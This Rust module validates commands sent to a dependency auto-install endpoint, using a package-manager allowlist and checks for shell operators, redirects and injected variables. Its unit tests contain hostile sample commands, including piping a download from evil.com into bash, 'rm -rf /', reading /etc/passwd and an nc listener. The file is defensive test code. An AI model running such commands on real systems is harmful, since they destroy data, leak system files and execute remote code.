//! Command security validation for auto-install endpoints.
//!
//! Provides command白名单 validation to prevent command injection attacks
//! on dependency auto-install endpoints.

use std::sync::LazyLock;

/// Allowed package managers for dependency installation.
/// These are trusted commands that can be executed via shell.
static ALLOWED_INSTALLERS: LazyLock<Vec<&'static str>> = LazyLock::new(|| {
    vec![
        // Linux
        "apt-get", "apt", "yum", "dnf", "pacman", "zypper", "snap", "flatpak", // macOS
        "brew", "port", // Windows
        "winget", "choco", "scoop", "pip", "pip3", "pipx", "npm", "yarn", "pnpm", "cargo", "go",
        // Generic
        "curl", "wget",
    ]
});

/// Dangerous shell operators that could allow command chaining.
const DANGEROUS_OPERATORS: &[&str] = &["&&", "||", "|", ";", "`", "$(", "$"];

/// Validation result for install commands.
#[derive(Debug, Clone)]
pub enum CommandValidation {
    /// Command is allowed and safe to execute.
    Allowed {
        base_command: String,
        args: Vec<String>,
    },
    /// Command is blocked due to security concerns.
    Blocked { reason: String },
}

/// Validate an install command for security.
///
/// Returns CommandValidation indicating whether the command is allowed.
pub fn validate_install_command(cmd: &str) -> CommandValidation {
    // 1. Check for dangerous shell operators
    for op in DANGEROUS_OPERATORS {
        if cmd.contains(op) {
            return CommandValidation::Blocked {
                reason: format!("Command contains dangerous operator: {}", op),
            };
        }
    }

    // 2. Check for path traversal attempts
    if cmd.contains("../") || cmd.contains("..\\") {
        return CommandValidation::Blocked {
            reason: "Command contains path traversal sequence".to_string(),
        };
    }

    // 3. Check for shell redirects
    if cmd.contains('>') || cmd.contains('<') {
        return CommandValidation::Blocked {
            reason: "Command contains shell redirect".to_string(),
        };
    }

    // 4. Check for newlines (could inject additional commands)
    if cmd.contains('\n') || cmd.contains('\r') {
        return CommandValidation::Blocked {
            reason: "Command contains newline character".to_string(),
        };
    }

    // 5. Parse command and check base against whitelist
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.is_empty() {
        return CommandValidation::Blocked {
            reason: "Empty command".to_string(),
        };
    }

    // Allowed environment variables that can be prepended to commands
    const ALLOWED_ENV_VARS: &[&str] = &[
        "DEBIAN_FRONTEND",
        "DEBCONF_NOWARNINGS",
        "TERM",
        "LANG",
        "LC_ALL",
    ];

    // Find the actual command (skip environment variable prefixes)
    let mut cmd_index = 0;
    for (i, part) in parts.iter().enumerate() {
        // Check if this is an environment variable assignment
        if part.contains('=') {
            let env_key = part.split('=').next().unwrap_or("");
            if ALLOWED_ENV_VARS.contains(&env_key) {
                cmd_index = i + 1;
                continue;
            }
        }
        // This is the actual command
        break;
    }

    if cmd_index >= parts.len() {
        return CommandValidation::Blocked {
            reason: "No command found after environment variables".to_string(),
        };
    }

    let base_cmd = parts[cmd_index];

    // Extract just the command name (handle full paths like /usr/bin/apt-get)
    let cmd_name = base_cmd
        .rsplit('/')
        .next()
        .unwrap_or(base_cmd)
        .rsplit('\\')
        .next()
        .unwrap_or(base_cmd);

    // 6. Check if command is in whitelist
    if !ALLOWED_INSTALLERS.contains(&cmd_name) {
        return CommandValidation::Blocked {
            reason: format!(
                "Command '{}' is not in the allowed list. Allowed: {}",
                cmd_name,
                ALLOWED_INSTALLERS.join(", ")
            ),
        };
    }

    // 7. Validate arguments (no dangerous patterns)
    for arg in &parts[cmd_index + 1..] {
        // Block attempts to execute other commands via arguments
        if arg.starts_with('/') && !arg.starts_with("/usr/") && !arg.starts_with("/bin/") {
            return CommandValidation::Blocked {
                reason: format!("Suspicious absolute path in argument: {}", arg),
            };
        }

        // Block environment variable injection in arguments (after the command)
        if arg.contains('=') && arg.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_') {
            let env_key = arg.split('=').next().unwrap_or("");
            return CommandValidation::Blocked {
                reason: format!(
                    "Environment variable injection attempt in arguments: {}",
                    env_key
                ),
            };
        }
    }

    CommandValidation::Allowed {
        base_command: cmd_name.to_string(),
        args: parts[cmd_index + 1..]
            .iter()
            .map(|s| s.to_string())
            .collect(),
    }
}

/// Check if a command is safe to execute.
pub fn is_command_safe(cmd: &str) -> bool {
    matches!(
        validate_install_command(cmd),
        CommandValidation::Allowed { .. }
    )
}

/// Get the list of allowed installer commands.
pub fn allowed_installers() -> &'static Vec<&'static str> {
    &ALLOWED_INSTALLERS
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowed_commands() {
        assert!(matches!(
            validate_install_command("apt-get install -y curl"),
            CommandValidation::Allowed { .. }
        ));
        assert!(matches!(
            validate_install_command("brew install node"),
            CommandValidation::Allowed { .. }
        ));
        assert!(matches!(
            validate_install_command("winget install Microsoft.VisualStudioCode"),
            CommandValidation::Allowed { .. }
        ));
        assert!(matches!(
            validate_install_command("pip install requests"),
            CommandValidation::Allowed { .. }
        ));
    }

    #[test]
    fn test_blocked_dangerous_operators() {
        assert!(matches!(
            validate_install_command("apt-get update && rm -rf /"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("curl http://evil.com | bash"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("echo hello ; rm -rf /"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("apt-get update || curl evil.com"),
            CommandValidation::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_command_substitution() {
        assert!(matches!(
            validate_install_command("$(cat /etc/passwd)"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("`whoami`"),
            CommandValidation::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_path_traversal() {
        assert!(matches!(
            validate_install_command("../../../bin/bash -c 'evil'"),
            CommandValidation::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_redirects() {
        assert!(matches!(
            validate_install_command("apt-get install > /tmp/log"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("cat < /etc/passwd"),
            CommandValidation::Blocked { .. }
        ));
    }

    #[test]
    fn test_blocked_non_whitelisted_command() {
        assert!(matches!(
            validate_install_command("rm -rf /"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("/bin/bash -c 'evil'"),
            CommandValidation::Blocked { .. }
        ));
        assert!(matches!(
            validate_install_command("nc -l -p 4444"),
            CommandValidation::Blocked { .. }
        ));
    }

    #[test]
    fn test_allowed_env_vars() {
        assert!(matches!(
            validate_install_command("DEBIAN_FRONTEND=noninteractive apt-get install -y curl"),
            CommandValidation::Allowed { .. }
        ));
    }

    #[test]
    fn test_blocked_env_var_injection() {
        assert!(matches!(
            validate_install_command("PATH=/evil/bin apt-get install curl"),
            CommandValidation::Blocked { .. }
        ));
    }

    #[test]
    fn test_is_command_safe() {
        assert!(is_command_safe("apt-get install -y curl"));
        assert!(!is_command_safe("rm -rf /"));
    }
}
